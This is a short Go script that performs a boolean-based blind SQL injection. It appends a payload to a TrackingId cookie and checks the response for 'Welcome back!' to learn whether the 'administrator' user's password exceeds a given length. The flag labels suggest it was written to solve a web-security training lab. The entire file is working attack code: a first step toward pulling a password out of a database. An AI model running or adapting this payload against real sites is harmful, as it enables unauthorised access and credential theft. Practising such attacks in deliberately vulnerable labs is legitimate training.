package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"

	"strings"
)

func main() {
	urlInput := flag.String("url", "", "Lab url")
	sessionInput := flag.String("session", "", "Lab sesion")
	trackingIdInput := flag.String("tracking-id", "", "Lab TrackingId")

	flag.Parse()

	myUrl := *urlInput
	mySession := *sessionInput
	myTrackingId := *trackingIdInput

	fmt.Println("Haxxing...")
	fmt.Println("url::: " + myUrl)
	fmt.Println("session::: " + mySession)
	fmt.Println("trackingId::: " + myTrackingId)
	fmt.Println("-------------------")

	payload := "' AND (SELECT 'z' FROM users WHERE username = 'administrator' AND LENGTH(password) > 1 LIMIT 1)='z"

	var client http.Client
	req, err := http.NewRequest("GET", myUrl, nil)
	if err != nil {
		log.Fatalln(err)
	}
	cookiez := "TrackingId=" + myTrackingId + payload + ";session=" + mySession
	req.Header.Set("Cookie", cookiez)

	respz, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	defer respz.Body.Close()
	body, err := ioutil.ReadAll(respz.Body)
	if err != nil {
		log.Fatalln(err)
	}

	sb := string(body)
	//fmt.Println(sb)

	hasWelcomeBack := strings.Contains(sb, "Welcome back!")

	fmt.Println("hasWelcomeBack:::", hasWelcomeBack)

}
